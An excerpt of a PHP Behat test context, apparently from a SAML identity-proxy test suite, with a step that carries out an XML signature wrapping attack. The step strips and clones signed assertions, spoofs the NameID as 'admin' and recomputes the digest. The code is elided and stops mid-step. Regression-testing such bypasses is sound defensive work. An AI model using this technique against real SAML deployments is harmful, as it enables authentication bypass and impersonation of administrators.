...
public function iSeeTheAttributesFromSourceOnConsentPage($source, TableNode $attributes)
{
    ...
    $expectedAttributes = $attributes->getRows();
...
public function iExploitTheXMLSignatureBypass()
{
    ...
    $samlResponse = base64_decode($samlResponseField->getAttribute('value'));

    // Convert response to DOMDocument
    $xmlDom = DOMDocumentFactory::fromString($samlResponse);
    ...
    // Remove original signature from response
    $response->removeChild($xpath->query("/saml_protocol:Response/ds:Signature")->item(0));

    // 1. Clone original assertion and put into wrapper
    $wrapper = $xmlDom->createElement('wrapper');
    $wrapper->appendChild($originalAssertion = $assertion->cloneNode(true));
    $response->appendChild($wrapper);

    // 2. Remove Signature from both assertions
    $assertion->removeChild($signature);
    $originalAssertion->removeChild($xpath->query("./ds:Signature", $originalAssertion)->item(0));

    // 3. Spoof assertion
    $xpath->query("/saml_protocol:Response/saml_assertion:Assertion/saml_assertion:Subject/saml_assertion:NameID")->item(0)->textContent = "admin";
    $xpath->query(
    ...
    )->item(0)->textContent = "ADMIN!";

    // 4. Change original assertion ID and compute new digest
    $assertion->setAttribute('ID', 'attack');
    $digestValue = $this->calculateDigest($assertion);

    // 5. Update SignedInfo with new digest and reference
    $signedInfo = $xpath->query("/saml_protocol:Response/saml_assertion:Assertion/ds:Signature/ds:SignedInfo")->item(0);
